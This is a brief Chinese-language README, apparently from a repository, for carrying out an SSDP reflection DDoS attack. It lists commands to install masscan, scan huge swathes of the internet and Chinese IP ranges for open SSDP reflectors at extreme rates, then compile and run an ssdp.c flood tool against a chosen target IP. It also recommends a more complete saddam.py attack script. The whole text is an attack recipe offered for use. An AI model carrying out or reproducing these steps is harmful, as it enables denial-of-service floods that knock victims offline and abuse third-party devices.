# Ddos Ssdp Attack
> Use Masscan Scan Server

### 安装环境
	yum install git make screen gcc

### 安装 Masscan
	git clone https://github.com/robertdavidgraham/masscan
	cd masscan
	make && make install

### 扫描 Server
	# 最高速扫描全网 SSDP 端口保存为 JSON
	screen masscan 0.0.0.0/4 -p1900 --rate 100000000 -oJ ip.json
	# 转换格式为单 IP 的 TXT
	python format.py ip.json ip.txt

> **扫描中国IP段方式**<br>
> screen masscan -iL ip/cn_ip.txt -p1900 --rate 100000000 -oJ ip.json

### 攻击 SSDP
	# 编译攻击脚本
	gcc -pthread ssdp.c -o ssdp
	# SSDP 攻击
	./ssdp <target IP> <target port> <reflection file> <time (optional)>

> 攻击或使用功能更全的 saddam.py 攻击脚本
